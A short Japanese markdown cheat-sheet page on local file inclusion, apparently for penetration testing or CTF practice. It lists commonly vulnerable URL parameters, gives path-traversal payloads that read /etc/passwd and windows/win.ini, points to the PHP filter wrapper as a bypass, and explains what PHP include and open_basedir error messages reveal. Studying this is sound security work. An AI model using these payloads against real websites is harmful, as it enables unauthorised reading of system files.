## 脆弱性がありそうなパラメータ例



        ?page=

        ?file=

        ?path=

        ?module=

        ?include=

        ?src=

        ?view=

        ?lang= (言語切り替えファイルなどを読み込んでいる場合)

### Linux
`../../../../../../etc/passwd`

### Windows
`../../../../../../windows/win.ini`

後ろに拡張子（.phpなど）が強制付与される場合もある

通らなくてもサニタイズされている可能性があるのでphpフィルターも試してみる

## エラーメッセージからの推測


    Warning: include(test.php): failed to open stream:

        # include() 関数が直接使われている

    open_basedir restriction in effect:

        # LFIはあるが、読み込めるディレクトリが制限されている


[PHP_Filter_Wrapper.mdへ](PHP_Filter_Wrapper.md)
